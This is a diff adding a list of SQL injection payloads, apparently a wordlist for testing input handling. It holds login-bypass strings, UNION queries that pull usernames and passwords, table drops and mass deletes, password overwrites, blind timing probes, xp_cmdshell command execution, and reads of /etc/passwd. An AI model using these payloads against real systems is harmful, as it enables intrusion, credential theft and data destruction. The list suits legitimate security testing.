@@ -1,0 +1,25 @@
+' OR '1'='1
+" OR "1"="1
+'; DROP TABLE users;--
+UNION SELECT * FROM users
+1' AND 1=1--
+admin' --
+' OR 1=1#
+1; DELETE FROM users
+' UNION SELECT username,password FROM users--
+1' ORDER BY 1--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--
+SELECT * FROM information_schema.tables
+INSERT INTO users VALUES('hacked','hacked')
+UPDATE users SET password='hacked' WHERE 1=1
+1' WAITFOR DELAY '0:0:5'--
+1'; EXEC xp_cmdshell('dir');--
+1' AND BENCHMARK(5000000,SHA1('test'))--
+1' AND SLEEP(5)--
+UNION SELECT LOAD_FILE('/etc/passwd')
+1' INTO OUTFILE '/tmp/dump.txt'--
+DECLARE @a NVARCHAR(100) SELECT @a=0x73656c656374
+1' HAVING 1=1--
+1' GROUP BY 1--
+CAST(1 AS VARCHAR)
+CONVERT(INT, 'test')
